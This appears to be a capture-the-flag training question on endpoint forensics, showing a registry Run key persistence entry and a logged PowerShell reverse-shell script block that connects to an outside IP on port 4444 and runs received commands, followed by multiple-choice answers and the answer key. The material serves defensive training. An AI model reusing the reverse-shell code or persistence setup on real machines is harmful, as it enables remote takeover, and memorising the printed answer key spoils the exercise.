![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Medium CTF - Persistence Mechanism

During an incident investigation, you run DeepBlueCLI against the System and Security event logs of a compromised machine. Among other findings, you pull the following registry key manually:

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

  Name    : WindowsUpdateHelper
  Type    : REG_SZ
  Data    : C:\Users\jsmith\AppData\Local\Temp\wuhelper.exe
```

You also find this in the PowerShell operational log:

```
[2024-11-15 08:02:10]  ScriptBlock:
  $client = New-Object System.Net.Sockets.TCPClient('185.220.101.47', 4444)
  $stream = $client.GetStream()
  [byte[]]$bytes = 0..65535 | % {0}
  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
      $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
      $sendback = (iex $data 2>&1 | Out-String)
      ...
  }
```

---

## Question

Based on the evidence above, which statement best describes what the attacker set up on this machine?

---

## Flags (Choose One)

- **A)** A keylogger that captures credentials and sends them via email on reboot
- **B)** A scheduled task that runs Windows Update silently to avoid detection
- **C)** A reverse shell payload disguised as a Windows Update helper, set to run at every user login via a registry Run key
- **D)** A port scanner embedded in a startup script used to map the internal network

---

Correct Flag: **C**

---

# Finished?
[Next Question](EA_hard.md)  
[Back to Card's Main Page](/Cards/EA/Endpoint_Analysis.md)
